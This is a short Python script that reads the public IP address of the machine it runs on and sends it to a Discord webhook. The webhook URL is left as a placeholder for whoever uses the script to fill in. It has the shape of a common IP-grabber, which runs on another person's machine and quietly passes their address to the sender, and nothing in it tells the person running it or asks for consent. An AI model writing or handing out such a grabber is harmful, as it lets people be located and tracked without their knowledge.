from requests import get
from discord_webhook import DiscordWebhook

### YOUR DISCORD WEBHOOK


webhook_url = 'WEBHOOK HERE'


### YOUR DISCORD WEBHOOK


#----------------------------#


ip = get('https://api.ipify.org').text
webhook = DiscordWebhook(url=webhook_url, content=f'IP Address is: ' +ip)
response = webhook.execute()
